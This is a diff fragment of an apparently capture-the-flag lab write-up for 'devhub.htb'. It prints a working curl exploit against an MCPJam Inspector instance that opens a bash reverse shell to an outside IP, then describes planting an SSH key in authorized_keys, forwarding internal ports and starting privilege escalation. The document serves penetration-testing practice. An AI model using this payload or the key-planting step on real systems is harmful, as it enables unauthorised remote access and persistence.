@@ -106,12 +106,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 - Port 80: `devhub.htb`
 - Port 6274: MCPJam Inspector v1.4.2 -> CVE-2026-23744
+# Getting Foothold
 Exploiting the vulnerable MCP Jam Inspector instance:
 ```bash
 curl -k http://devhub.htb:6274/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"/bin/bash\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/10.10.14.105/44444 0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}"
 ```
 To trigger revshell as `mcp-dev`
 Go to `mcp-dev's` home directory, generate/ drop a public key in .ssh/authorized_keys to ssh as `mcp-dev` and forward the two service in loopback interface (8888 and 5000) to my machine.
+# Privilege Escalation
 - Port 8888 is a Jupyter server.
 ```bash
 ps aux | grep analyst
